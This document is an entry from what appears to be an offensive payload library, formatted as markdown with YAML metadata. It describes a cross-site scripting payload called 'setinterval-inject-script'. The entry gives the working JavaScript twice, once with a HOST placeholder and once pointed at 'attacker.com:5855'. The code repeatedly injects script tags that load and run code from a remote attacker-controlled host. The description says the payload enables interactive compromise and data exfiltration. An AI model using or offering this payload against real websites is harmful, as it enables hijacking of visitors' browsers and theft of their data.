---
data: >-
  setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:5855'},100)
tags:
  - xss
  - injection
  - remote
type: command
executor: javascript
platforms:
  - Web
id: 44cfa31d-5e4b-4584-beca-685ae0094b64
created_at: '2025-12-14T03:16:14.044Z'
updated_at: '2025-12-14T03:16:14.044Z'
verified: false
validated: true
submitted: true
---
# setinterval-inject-script

## Command

```javascript
setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:5855'},100)
```

## Description

JavaScript payload that every 100ms appends a script tag to the document body, loading and executing code from a remote attacker-controlled host, enabling interactive compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Remote script URL | Yes |
| interval | Polling interval in ms | Yes |

## Examples

### Basic Usage

```javascript
setInterval(function(){with(document)body.appendChild(createElement('script')).src='//attacker.com:5855'},100)
```

## Expected Output

Continuously injects and executes scripts from the specified host, potentially logging actions or exfiltrating data.

## Related

- [[Related Procedure: Trigger-XSS-by-Viewing-Uploaded-SVG]]
